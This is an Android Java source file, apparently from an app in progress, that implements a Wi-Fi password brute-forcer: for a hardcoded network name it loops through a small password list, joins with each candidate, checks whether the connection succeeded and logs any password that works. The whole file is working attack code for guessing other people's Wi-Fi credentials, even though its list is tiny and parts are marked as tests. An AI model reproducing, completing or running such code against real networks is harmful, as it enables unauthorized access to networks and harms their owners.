package BruteFragment;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;

import LogFragment.LogFragment;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import logic.ShowToast;

import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.TextView;

import com.linkclink.gfr.R;

public class BruteFragment extends Fragment {

    private String currentBruteSSID = "Barsa";
    private String networkPass = "brat22AA";

    private String[] passwordTable = {"12345", "dsadsadsa", "brat22AA", "fsdfdfsfdssf"};

    int netId = 0;

    private LayoutInflater inflater;
    private ViewGroup container;

    private View view;

    private Button buttonBrute;
    private Button buttonBruteAll;

    private WifiManager wifiManager;
    WifiInfo wifiInfo;
    private WifiConfiguration wifiConfiguration;

    private int flagStartBrute = 0;

    private Bundle bundle;

    private String ssid;

    boolean check;

    public static BruteFragment newInstance() {
        return new BruteFragment();
    }

    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {

        this.container = container;
        this.inflater = inflater;
        InitialisationComponents();

        wifiManager = (WifiManager) getContext().getApplicationContext().getSystemService(Context.WIFI_SERVICE);


        buttonBrute.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Brute();
            }
        });

        return view;
    }

    private void InitialisationComponents() {
        view = inflater.inflate(R.layout.brute_fragment, container, false);
        buttonBrute = (Button) view.findViewById(R.id.button_brute);
        buttonBruteAll = (Button) view.findViewById(R.id.button_bruteAll);
    }

    /* Test */
    private void Brute() {

        GetLogResult("Brute/Start brute wifi: " + currentBruteSSID);

        /* Test */
        for (int i = 0; i < passwordTable.length; i++) {

            if(flagStartBrute == 0) {
                /* Remove wifi */
                wifiManager.removeNetwork(netId);

                /* Config */
                wifiConfiguration = new WifiConfiguration();
                wifiConfiguration.SSID = String.format("\"%s\"", currentBruteSSID);
                wifiConfiguration.preSharedKey = String.format("\"%s\"", passwordTable[i]);
                /*  */

                netId = wifiManager.addNetwork(wifiConfiguration);

                wifiManager.disconnect();
                wifiManager.enableNetwork(netId, true);
                wifiManager.reconnect();


                flagStartBrute = 1;
                if (CheckSuccessConnect() == true) {
                    GetLogResult("Pass to WIF:" + currentBruteSSID + "Pass: " + passwordTable[i]);
                    GetLogGoodResults("WIFI: " + currentBruteSSID + " Pass:" + passwordTable[i]);
                    break;
                }
            }

        }
    }

    /* Test */
    private boolean CheckSuccessConnect() {

        String data;

        // e.g. To check the Network Name or other info:
        wifiInfo = wifiManager.getConnectionInfo();
        ssid = wifiInfo.getSSID();

        ssid = ssid.substring(1,ssid.length()-1);

        GetLogResult("Brute/Connect "+ ssid);

        if(currentBruteSSID.equals(ssid))
        {
            GetLogResult("Success connect");
            flagStartBrute = 0;
            return true;
        }


        flagStartBrute = 0;
        return false;
    }

    /* Test */
    private void GetLogResult(String text) {
        bundle = new Bundle();
        bundle.putString("log", text);
        getParentFragmentManager().setFragmentResult("log", bundle);
    }

    private void GetLogGoodResults(String text)
    {
        bundle = new Bundle();
        bundle.putString("logGod",text);
        getParentFragmentManager().setFragmentResult("logGod", bundle);
    }




}
